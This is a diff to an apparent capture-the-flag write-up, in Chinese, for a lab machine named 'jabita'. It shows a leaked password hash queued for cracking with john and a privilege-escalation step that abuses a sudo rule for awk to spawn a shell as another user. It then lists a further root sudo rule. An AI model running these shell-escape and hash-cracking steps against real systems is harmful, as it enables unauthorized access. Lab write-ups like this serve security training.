@@ -35,3 +35,30 @@ jaba:$y$j9T$pWlo6WbJDbnYz6qZlM87d.$CGQnSEL8aHLlBY/4Il6jFieCPzj7wk54P8K4j/xhi/1:1
 # john爆破
 
 
+
+
+# 提权
+
+```c
+jack@jabita:~$ sudo -l
+    (jaba : jaba) NOPASSWD: /usr/bin/awk 
+```
+
+然后去这个网站搜索相关命令getshell，，，awk
+[GTFOBins](https://gtfobins.github.io/)
+
+```c
+sudo awk 'BEGIN {system("/bin/sh")}'
+```
+
+```c
+jack@jabita:~$ sudo -u jaba  /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+$ id
+uid=1002(jaba) gid=1002(jaba) groups=1002(jaba)
+
+$ script /dev/null -c bash
+jaba@jabita:/home/jack$ sudo -l
+    (root) NOPASSWD: /usr/bin/python3 /usr/bin/clean.py
+
+
+```
